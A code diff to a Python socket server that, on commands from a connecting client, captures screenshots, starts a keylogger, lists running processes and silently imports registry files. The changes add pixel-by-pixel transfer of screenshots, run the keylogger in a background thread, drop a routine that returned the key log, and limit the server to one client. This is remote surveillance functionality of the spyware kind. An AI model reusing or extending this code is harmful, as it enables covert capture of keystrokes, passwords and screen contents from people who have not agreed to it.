@@ -2,6 +2,8 @@ import sys
 import socket
 import threading
 import time
+from PIL import Image
+import numpy as np
 from ScreenShot import*
 from RunningProccess import*
 from KeyLogger import*
@@ -10,7 +12,7 @@ from Registry import*
 
 HEADER = 64
 PORT = 5050
-#SERVER = socket.gethostbyname(socket.gethostname())
+# SERVER = socket.gethostbyname(socket.gethostname())
 SERVER = "127.0.0.1"
 ADDR= (SERVER, PORT)
 FORMAT = 'utf-8'
@@ -65,15 +67,22 @@ def send_file(conn, filename):
     file = open(filename,"rb")
     size = get_Size(file)
     size = str(size)
+    print(size)
     file.close()
     # conn.send(size.encode(FORMAT))
     send1(conn,size)
 
     with open(filename, "rb") as fp:
+        # i=0
         data = fp.read(1024)
+        # print(f"{i}    {sys.getsizeof(data)}")
         while data:
             conn.send(data)
+            # i += 1
             data = fp.read(1024)
+            # print(f"{i}    {sys.getsizeof(data)}")
+
+
             if not data:
                 break
 
@@ -94,7 +103,39 @@ def recv_file(conn, filename):
             if size - i < 1024:
                 byte_read = size - i
 
+def send_img(conn,filename):
+    im = Image.open(filename,'r')
+    width,height = im.size
+    pic_data = list(im.getdata())
+    send1(conn,str(width))
+    send1(conn,str(height))
+    len =width*height
+    for i in range(len):
+        send1(conn,str(pic_data[i][0]))
+        send1(conn,str(pic_data[i][1]))            
+        send1(conn,str(pic_data[i][2]))            
 
+
+    
+
+def recv_img(conn,filename):
+    width = recv1(conn)
+    height = recv1(conn)
+    width = int(width)
+    height = int(height)
+    pixels = list()
+    for i in range(height):
+        tmp = list()
+        for j in range(width):
+            r = int(recv1(conn))
+            g = int(recv1(conn))
+            b = int(recv1(conn))
+            pxl =(r,g,b)
+            tmp.append(pxl)
+        pixels.append(tmp)
+    array = np.array(pixels, dtype=np.uint8)
+    new_img = Image.fromarray(array)
+    new_img.save(filename)
 
 
 def conn_recv_reg_file(conn):
@@ -109,19 +150,6 @@ def conn_recv_reg_file(conn):
         os.system("regedit /s " + filename)
         return True
     return False
-            
-
-
-def side_request(conn,addr):
-    msg = recv1(conn)
-    if msg == STOP_KEYLOGGING:
-        Key_press(Key.f12)
-    elif msg == PRINT_KEYLOG:
-        Key_press(Key.f12)
-        with open("KeyLog.txt","r") as file:
-            key_log_string=file.read()
-            
-        send1(conn,key_log_string)
 
 
 
@@ -143,7 +171,8 @@ def handle_client(conn, addr):
             if msg == TAKE_SCREEN_SHOT:
                 
                 Take_Screenshot("ScreenShot.png")
-                send_file(conn,"ScreenShot.png")
+                # send_file(conn,"ScreenShot.png")
+                send_img(conn, "ScreenShot.png")
                     
 
 
@@ -189,10 +218,11 @@ def handle_client(conn, addr):
 
                 
             elif msg == KEYLOGGING:
-                sidequest_thread = threading.Thread(target= handle_client,args=(conn,addr))
+                def init_listener():
+                    with Listener(on_press = getKey) as listener:
+                        listener.join()
+                sidequest_thread = threading.Thread(target= init_listener)
                 sidequest_thread.start()
-                with Listener(on_press = getKey) as listener:
-                    listener.join()
             
             elif msg == STOP_KEYLOGGING:
                 for i in range(10):
@@ -287,11 +317,12 @@ def handle_client(conn, addr):
 def start():
     server.listen()
     print(f"[LISTENING] Server is listening on {SERVER}")
-    while True:
-        conn, addr = server.accept()
-        thread = threading.Thread(target = handle_client, args= (conn,addr))
-        thread.start()
-        print(f"[ACTIVE CONNECTIONS] {threading.activeCount() - 1}")
+    conn, addr = server.accept()
+    handle_client(conn,addr)
+    print(f"[ACTIVE CONNECTIONS] {threading.activeCount() - 1}")
+    # while True:
+    #     thread = threading.Thread(target = handle_client, args= (conn,addr))
+    #     thread.start()
 
 
     
